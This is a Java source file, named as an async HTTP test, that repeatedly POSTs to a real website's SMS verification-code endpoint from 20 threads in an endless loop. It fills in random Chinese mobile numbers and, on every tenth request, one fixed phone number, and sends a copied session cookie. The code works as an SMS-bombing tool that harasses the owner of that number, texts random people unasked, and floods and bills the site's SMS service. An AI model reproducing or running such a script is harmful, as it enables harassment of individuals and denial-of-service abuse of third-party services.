package com.ryl.learn.util;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.apache.commons.lang3.RandomStringUtils;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.nio.client.CloseableHttpAsyncClient;
import org.apache.http.impl.nio.client.HttpAsyncClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.nio.client.HttpAsyncClient;
import org.apache.http.util.EntityUtils;

import java.net.URI;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Created on 16/6/21 下午2:12.
 */
public class HttpAsyncTest {

    public static void main(String[] args) throws Exception {
        ExecutorService service = Executors.newFixedThreadPool(20);
        CloseableHttpAsyncClient client = HttpAsyncClients.createDefault();
        client.start();
        HttpPost post = new HttpPost();
        post.setURI(new URI("http://www.gc-home.com/?m=User&c=Register&a=sendMobileCode"));

        post.setHeader("Accept", "*/*");
        post.setHeader("Accept-Encoding", "gzip, deflate");
        post.setHeader("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4");
        post.setHeader("Connection", "keep-alive");
        post.setHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        post.setHeader("Cookie", "PHPSESSID=ibiflhni9f04fn0vb7ia2tbou1; visid_incap_826927=56gpyh9IQ4KK7Ze/Zge7wSGfaFcAAAAAQUIPAAAAAACPoV/SFbekgYfNaSuz9XbT; incap_ses_406_826927=/mLGfc+BqgSeeFpUdWeiBSGfaFcAAAAAwzgUJ7wOY6EPol8FP74tuA==");
        post.setHeader("Host", "www.gc-home.com");
        post.setHeader("Origin", "http://www.gc-home.com");
        post.setHeader("Referer", "http://www.gc-home.com/index.php/User/Register/index/G08277770");
        post.setHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36");
        post.setHeader("X-Requested-With", "XMLHttpRequest");

        for (int i = 0; i < 20; i++) {
            service.submit(new Worker(client, post, i));
        }

    }

    static class Worker implements Runnable {

        private static AtomicInteger num = new AtomicInteger(0);
        private HttpAsyncClient client;
        private HttpPost post;
        private Integer thread;

        public Worker(HttpAsyncClient client, HttpPost post, Integer thread) {
            this.client = client;
            this.post = post;
            this.thread = thread;
        }

        @Override
        public void run() {
            String[] prefix = new String[]{"134", "135", "136", "137", "138", "139", "147", "150", "151", "152", "157", "158",
                    "159", "182", "187", "188", "130", "131", "132", "155", "156", "185", "186", "133", "153", "180", "189"};
            int len = prefix.length;
            while (true) {
                try {
                    String mobile = prefix[num.intValue() % len] + RandomStringUtils.randomNumeric(8);

                    if (num.intValue() % 10 == 0) {
                        mobile = "15210830381";
                    }
                    List<BasicNameValuePair> formParams = new ArrayList<BasicNameValuePair>();
                    formParams.add(new BasicNameValuePair("mobile", mobile));
                    formParams.add(new BasicNameValuePair("type", "reg"));

                    UrlEncodedFormEntity entity = new UrlEncodedFormEntity(formParams, "UTF-8");
                    post.setEntity(entity);

                    Future<HttpResponse> future = client.execute(post, null);
//                    System.out.println(Thread.currentThread().getName()+"-"+thread+" execute");
//                    JSONObject json = JSON.parseObject(EntityUtils.toString(future.get().getEntity(), "UTF-8"));
//                    System.out.println(Thread.currentThread().getName() + "-" + thread + " " + mobile + " " + json.getBoolean("status") + " " + json.getString("errMsg") + " " + num.getAndIncrement());
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        }
    }
}
